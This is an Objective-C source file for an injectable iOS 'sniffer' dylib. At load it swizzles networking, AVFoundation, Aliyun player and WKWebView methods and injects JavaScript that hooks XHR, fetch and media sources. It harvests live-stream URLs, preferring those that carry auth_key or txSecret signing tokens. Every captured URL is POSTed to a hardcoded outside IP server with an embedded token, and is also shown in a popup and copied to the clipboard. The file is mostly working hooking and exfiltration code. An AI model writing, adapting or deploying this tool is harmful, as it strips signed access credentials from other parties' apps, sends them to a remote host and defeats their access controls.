//
// AliSniffer_singlefile.m
// 单文件嗅探器（弹窗 + 纯文本上报 + X-Token）
// - 优先 auth_key
// - 去重窗口（默认 60s）
// - 弹窗 + 复制到剪贴板
//
// 修改 PUSH_ENDPOINT / PUSH_TOKEN 为你的服务
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import <AVFoundation/AVFoundation.h>
#import <WebKit/WebKit.h>
#import <objc/message.h>

#pragma mark - Config
static NSString * const PUSH_ENDPOINT = @"http://139.155.57.242:8088/push"; // 改为你的上报地址
static NSString * const PUSH_TOKEN    = @"@Yy166431";                     // 令牌
static NSTimeInterval const DEDUPE_WINDOW = 60.0; // 秒

#pragma mark - Globals
static NSMutableDictionary<NSString*, NSDate*> *g_dedupe = nil;
static dispatch_queue_t g_sniffer_queue = NULL;

#pragma mark - Helper Functions

static inline void dispatch_main_safe(dispatch_block_t b) {
    if (!b) return;
    if ([NSThread isMainThread]) b();
    else dispatch_async(dispatch_get_main_queue(), b);
}

static BOOL isLikelyStreamURL(NSString *u) {
    if (!u || u.length == 0) return NO;
    NSString *s = [u lowercaseString];
    if ([s containsString:@".m3u8"] || [s containsString:@".flv"] || [s containsString:@"rtmp://"]) return YES;
    if ([s containsString:@"auth_key="] || [s containsString:@"txsecret="] || [s containsString:@"txkey="]) return YES;
    if ([s containsString:@"phonelive"] || [s containsString:@"pull.kuniunet"] || [s containsString:@"/live"] || [s containsString:@"replay"]) return YES;
    return NO;
}

static BOOL hasAuthKey(NSString *u) {
    if (!u) return NO;
    NSString *s = [u lowercaseString];
    return ([s rangeOfString:@"auth_key="].location != NSNotFound) ||
           ([s rangeOfString:@"txsecret="].location != NSNotFound) ||
           ([s rangeOfString:@"txkey="].location != NSNotFound);
}

static BOOL dedupe_check_and_mark(NSString *u) {
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(g_sniffer_queue, ^{
        NSDate *last = g_dedupe[u];
        NSDate *now = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < DEDUPE_WINDOW) {
            skip = YES;
        } else {
            g_dedupe[u] = now;
            skip = NO;
        }
    });
    return skip;
}

static void copyToPasteboard(NSString *s) {
    if (!s) return;
    dispatch_main_safe(^{
        @try {
            UIPasteboard *pb = [UIPasteboard generalPasteboard];
            pb.string = s;
        } @catch (NSException *e) {}
    });
}

static void showPopup(NSString *title, NSString *msg, NSString *urlToCopy) {
    dispatch_main_safe(^{
        @try {
            // Find top-most view controller
            UIWindow *keyWindow = nil;
            if (@available(iOS 13.0, *)) {
                for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
                    if (scene.activationState == UISceneActivationStateForegroundActive) {
                        for (UIWindow *w in scene.windows) {
                            if (w.isKeyWindow) { keyWindow = w; break; }
                        }
                        if (keyWindow) break;
                    }
                }
            } else {
                keyWindow = [UIApplication sharedApplication].keyWindow;
            }
            if (!keyWindow) keyWindow = [UIApplication sharedApplication].windows.firstObject;
            UIViewController *root = keyWindow.rootViewController;
            while (root.presentedViewController) root = root.presentedViewController;

            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                if (urlToCopy) copyToPasteboard(urlToCopy);
            }]];
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [root presentViewController:ac animated:YES completion:nil];
        } @catch (NSException *e) {
            // last-resort: do nothing
        }
    });
}

#pragma mark - Network Post (text/plain + X-Token)

static void postURLToServer(NSString *u, void (^completion)(BOOL ok)) {
    if (!u || u.length==0) { if (completion) completion(NO); return; }
    NSURL *url = [NSURL URLWithString:PUSH_ENDPOINT];
    if (!url) { if (completion) completion(NO); return; }

    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    [req setValue:PUSH_TOKEN forHTTPHeaderField:@"X-Token"];
    [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    NSString *body = [u hasSuffix:@"\n"] ? u : [u stringByAppendingString:@"\n"];
    req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];

    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req
                                                                 completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        BOOL ok = NO;
        if (!error && [response isKindOfClass:[NSHTTPURLResponse class]]) {
            NSInteger sc = ((NSHTTPURLResponse*)response).statusCode;
            ok = (sc >= 200 && sc < 300);
        }
        if (completion) completion(ok);
    }];
    [task resume];
}

#pragma mark - Capture Handler

static void handleCapturedURL(NSString *u, NSString *where) {
    if (!u) return;
    if (!isLikelyStreamURL(u)) return;
    if (dedupe_check_and_mark(u)) return;

    // Prefer auth_key: when present mark as priority (but still POST)
    if (hasAuthKey(u)) {
        postURLToServer(u, ^(BOOL ok) {
            NSString *title = @"捕获到直播源（优先）";
            NSString *msg = [NSString stringWithFormat:@"%@\n%@", where?where:@"来源", u];
            showPopup(title, msg, u);
            copyToPasteboard(u);
        });
    } else {
        postURLToServer(u, ^(BOOL ok) {
            NSString *title = @"捕获到直播源";
            NSString *msg = [NSString stringWithFormat:@"%@\n%@", where?where:@"来源", u];
            showPopup(title, msg, u);
            copyToPasteboard(u);
        });
    }
}

#pragma mark - Safe Hooking Utilities

// save originals
static void (*orig_NSURLSessionTask_resume)(id, SEL) = NULL;
static id  (*orig_AVPlayerItem_playerItemWithURL)(id, SEL, NSURL *) = NULL;
static id  (*orig_AVURLAsset_URLAssetWithURL_options)(id, SEL, NSURL *, NSDictionary *) = NULL;

#pragma mark - Hook Implementations

// NSURLSessionTask -resume
static void sniff_NSURLSessionTask_resume(id self, SEL _cmd) {
    @try {
        NSURLRequest *req = nil;
        if ([self respondsToSelector:@selector(currentRequest)]) {
            req = ((NSURLRequest *(*)(id, SEL))objc_msgSend)(self, sel_getUid("currentRequest"));
        } else if ([self respondsToSelector:@selector(originalRequest)]) {
            req = ((NSURLRequest *(*)(id, SEL))objc_msgSend)(self, sel_getUid("originalRequest"));
        }
        NSString *url = req.URL.absoluteString;
        if (url) {
            dispatch_async(g_sniffer_queue, ^{
                handleCapturedURL(url, @"NSURLSessionTask");
            });
        }
    } @catch (NSException *e) {
        // ignore
    }
    // call original
    if (orig_NSURLSessionTask_resume) {
        orig_NSURLSessionTask_resume(self, _cmd);
    }
}

// AVPlayerItem +playerItemWithURL:
static id sniff_AVPlayerItem_playerItemWithURL(id self, SEL _cmd, NSURL *URL) {
    @try {
        if (URL.absoluteString) {
            dispatch_async(g_sniffer_queue, ^{
                handleCapturedURL(URL.absoluteString, @"AVPlayerItem");
            });
        }
    } @catch (NSException *e) {}
    if (orig_AVPlayerItem_playerItemWithURL) {
        return orig_AVPlayerItem_playerItemWithURL(self, _cmd, URL);
    }
    return nil;
}

// AVURLAsset +URLAssetWithURL:options:
static id sniff_AVURLAsset_URLAssetWithURL_options(id self, SEL _cmd, NSURL *URL, NSDictionary *options) {
    @try {
        if (URL.absoluteString) {
            dispatch_async(g_sniffer_queue, ^{
                handleCapturedURL(URL.absoluteString, @"AVURLAsset");
            });
        }
    } @catch (NSException *e) {}
    if (orig_AVURLAsset_URLAssetWithURL_options) {
        return orig_AVURLAsset_URLAssetWithURL_options(self, _cmd, URL, options);
    }
    return nil;
}

#pragma mark - Aliyun Player Attempt (best effort)

static void try_hook_aliyun_player(void) {
    // try AVPUrlSource +urlWithString: and -setUrl:
    Class clsAVP = objc_getClass("AVPUrlSource");
    if (clsAVP) {
        // +urlWithString:
        SEL urlWithStringSel = sel_getUid("urlWithString:");
        Method mCls = class_getClassMethod(clsAVP, urlWithStringSel);
        if (mCls) {
            IMP origImp = method_getImplementation(mCls);
            // replace with block impl that calls original by invoking origImp
            IMP newImp = imp_implementationWithBlock(^id(id _self, NSString *urlStr){
                if (urlStr) dispatch_async(g_sniffer_queue, ^{ handleCapturedURL(urlStr, @"AVPUrlSource.urlWithString"); });
                if (origImp) {
                    id (*fn)(id, SEL, NSString*) = (id(*)(id, SEL, NSString*))origImp;
                    return fn(_self, urlWithStringSel, urlStr);
                }
                return (id)nil;
            });
            method_setImplementation(mCls, newImp);
        }
        // -setUrl:
        SEL instSetSel = sel_getUid("setUrl:");
        Method minst = class_getInstanceMethod(clsAVP, instSetSel);
        if (minst) {
            IMP origImp = method_getImplementation(minst);
            IMP newImp = imp_implementationWithBlock(^(id _self, NSString *urlStr){
                if (urlStr) dispatch_async(g_sniffer_queue, ^{ handleCapturedURL(urlStr, @"AVPUrlSource.setUrl"); });
                if (origImp) {
                    void (*fn)(id, SEL, NSString*) = (void(*)(id, SEL, NSString*))origImp;
                    fn(_self, instSetSel, urlStr);
                }
            });
            method_setImplementation(minst, newImp);
        }
    }

    // try AliPlayer setUrl:
    Class clsAli = objc_getClass("AliPlayer");
    if (clsAli) {
        SEL setUrlSel = sel_getUid("setUrl:");
        Method mset = class_getInstanceMethod(clsAli, setUrlSel);
        if (mset) {
            IMP origImp = method_getImplementation(mset);
            IMP newImp = imp_implementationWithBlock(^(id _self, NSString *urlStr){
                if (urlStr) dispatch_async(g_sniffer_queue, ^{ handleCapturedURL(urlStr, @"AliPlayer.setUrl"); });
                if (origImp) {
                    void (*fn)(id, SEL, NSString*) = (void(*)(id, SEL, NSString*))origImp;
                    fn(_self, setUrlSel, urlStr);
                }
            });
            method_setImplementation(mset, newImp);
        }
        // try setStsSource:/setAuthSource:/setMpsSource: to extract nested URL fields
        NSArray<NSString*> *other = @[@"setStsSource:", @"setAuthSource:", @"setMpsSource:"];
        for (NSString *selName in other) {
            SEL s = sel_getUid(selName.UTF8String);
            Method mo = class_getInstanceMethod(clsAli, s);
            if (mo) {
                IMP origImp = method_getImplementation(mo);
                IMP newImp = imp_implementationWithBlock(^(id _self, id src){
                    @try {
                        NSString *urlStr = nil;
                        if ([src respondsToSelector:@selector(valueForKey:)]) {
                            @try { urlStr = [src valueForKey:@"url"]; } @catch(...) {}
                            if (!urlStr) {
                                @try { urlStr = [src valueForKey:@"playUrl"]; } @catch(...) {}
                            }
                        }
                        if (urlStr) dispatch_async(g_sniffer_queue, ^{ handleCapturedURL(urlStr, [NSString stringWithFormat:@"AliPlayer.%@", selName]); });
                    } @catch (NSException *e) {}
                    if (origImp) {
                        void (*fn)(id, SEL, id) = (void(*)(id, SEL, id))origImp;
                        fn(_self, s, src);
                    }
                });
                method_setImplementation(mo, newImp);
            }
        }
    }
}

#pragma mark - WKWebView injection (best-effort, safe)

static void install_WK_injection(void) {
    Class wk = objc_getClass("WKWebView");
    if (!wk) return;
    SEL selLoad = sel_getUid("loadRequest:");
    Method mload = class_getInstanceMethod(wk, selLoad);
    if (!mload) return;
    // Store original impl
    IMP orig = method_getImplementation(mload);
    IMP newImp = imp_implementationWithBlock(^(id self, NSURLRequest *req){
        @try {
            if (req && req.URL.absoluteString) {
                dispatch_async(g_sniffer_queue, ^{ handleCapturedURL(req.URL.absoluteString, @"WKWebView.loadRequest"); });
            }
            // call original
            if (orig) {
                void (*fn)(id, SEL, NSURLRequest *) = (void(*)(id, SEL, NSURLRequest*))orig;
                fn(self, selLoad, req);
            }
            // inject safely on main queue after small delay
            dispatch_main_safe(^{
                @try {
                    NSString *js = @"(function(){"
                    "function sniff(u){ try{ if(!u) return; window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.snifferHandler && window.webkit.messageHandlers.snifferHandler.postMessage(u);}catch(e){} }"
                    "var _open = XMLHttpRequest.prototype.open; if(_open){ XMLHttpRequest.prototype.open = function(m,u){ try{ sniff(u);}catch(e){}; return _open.apply(this, arguments); }; }"
                    "if (window.fetch){ var _oldFetch = window.fetch; window.fetch = function(){ try{ if(arguments && arguments[0]) sniff(arguments[0].toString());}catch(e){}; return _oldFetch.apply(this, arguments); }; }"
                    "var setsrc = Object.getOwnPropertyDescriptor(HTMLMediaElement.prototype, 'src'); if(setsrc && setsrc.set){ var old = setsrc.set; Object.defineProperty(HTMLMediaElement.prototype, 'src', { set: function(v){ try{ sniff(v);}catch(e){}; return old.call(this, v); } }); }"
                    "})();";
                    [ (WKWebView*)self evaluateJavaScript:js completionHandler:nil ];
                } @catch (NSException *e) {}
            });
        } @catch (NSException *e) {}
    });
    method_setImplementation(mload, newImp);
}

#pragma mark - Bootstrap

__attribute__((constructor))
static void ali_sniffer_bootstrap(void) {
    @try {
        // init
        if (!g_sniffer_queue) g_sniffer_queue = dispatch_queue_create("com.alisniffer.queue", DISPATCH_QUEUE_SERIAL);
        if (!g_dedupe) g_dedupe = [NSMutableDictionary dictionary];

        // Show tiny popup that sniffer loaded (so you know injection succeeded)
        NSString *ver = @"AliSniffer loaded";
        NSString *msg = @"嗅探器已注入（简单通知）";
        showPopup(ver, msg, nil);

        // install safe hooks
        // 1) NSURLSessionTask resume
        Class clsTask = objc_getClass("NSURLSessionTask");
        if (clsTask) {
            Method m = class_getInstanceMethod(clsTask, sel_getUid("resume"));
            if (m) {
                orig_NSURLSessionTask_resume = (void(*)(id, SEL))method_getImplementation(m);
                method_setImplementation(m, (IMP)sniff_NSURLSessionTask_resume);
            }
        }

        // 2) AVPlayerItem +playerItemWithURL:
        Class clsAVPI = objc_getClass("AVPlayerItem");
        if (clsAVPI) {
            Method m = class_getClassMethod(clsAVPI, sel_getUid("playerItemWithURL:"));
            if (m) {
                orig_AVPlayerItem_playerItemWithURL = (id(*)(id, SEL, NSURL*))method_getImplementation(m);
                method_setImplementation(m, (IMP)sniff_AVPlayerItem_playerItemWithURL);
            }
        }

        // 3) AVURLAsset +URLAssetWithURL:options:
        Class clsAVUA = objc_getClass("AVURLAsset");
        if (clsAVUA) {
            Method m = class_getClassMethod(clsAVUA, sel_getUid("URLAssetWithURL:options:"));
            if (m) {
                orig_AVURLAsset_URLAssetWithURL_options = (id(*)(id, SEL, NSURL*, NSDictionary*))method_getImplementation(m);
                method_setImplementation(m, (IMP)sniff_AVURLAsset_URLAssetWithURL_options);
            }
        }

        // 4) WKWebView injection (best-effort)
        install_WK_injection();

        // 5) try AliyunPlayer hooks
        try_hook_aliyun_player();

    } @catch (NSException *e) {
        // show popup on exception to help debug on device
        NSString *title = @"Sniffer 启动异常";
        NSString *msg = [NSString stringWithFormat:@"错误: %@", e.reason ?: @"unknown"];
        showPopup(title, msg, nil);
    }
}
